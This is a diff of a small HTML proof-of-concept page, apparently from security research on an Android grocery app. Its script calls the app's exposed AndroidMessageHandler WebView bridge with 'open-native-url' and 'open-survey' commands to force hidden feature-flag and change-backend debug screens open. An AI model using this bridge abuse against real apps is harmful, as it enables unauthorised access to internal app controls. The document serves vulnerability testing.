@@ -1,24 +1,27 @@
 <html>
 <body>
-     <h1>Oda Security Audit</h1>
-     <p>Triggering Debug Menu...</p>
+     <h1>Oda Security Research</h1>
+     <p>Testing Bridge to Internal Screens...</p>
      <script>
-         setTimeout(function() {
+         function trigger(payload) {
              if (window.AndroidMessageHandler) {
-                 // Mencoba membuka menu Feature Flag
-                 AndroidMessageHandler.postMessage(JSON.stringify({
-                     "command": "open-native-url",
-                     "url": "kolonialno://android_native/feature_flag"
-                 }));
-
-                 // Backup: Mencoba membuka menu Change Backend
-                 setTimeout(function() {
-                     AndroidMessageHandler.postMessage(JSON.stringify({
-                         "command": "open-native-url",
-                         "url": "kolonialno://android_native/change_backend"
-                     }));
-                 }, 1000);
+                 AndroidMessageHandler.postMessage(JSON.stringify(payload));
              }
+         }
+
+         setTimeout(function() {
+             // Percobaan 1: Menggunakan skema kolonialno
+             trigger({"command":"open-native-url", "url":"kolonialno://android_native/feature_flag"});
+
+             // Percobaan 2: Menggunakan ID screen langsung (jika bridge mendukung)
+             setTimeout(function() {
+                 trigger({"command":"open-native-url", "url":"feature_flag_setting_screen"});
+             }, 1000);
+
+             // Percobaan 3: Mencoba membuka Survey dengan URL internal
+             setTimeout(function() {
+                 trigger({"command":"open-survey", "jsonUrl":"kolonialno://android_native/change_backend"});
+             }, 2000);
          }, 1000);
      </script>
 </body>
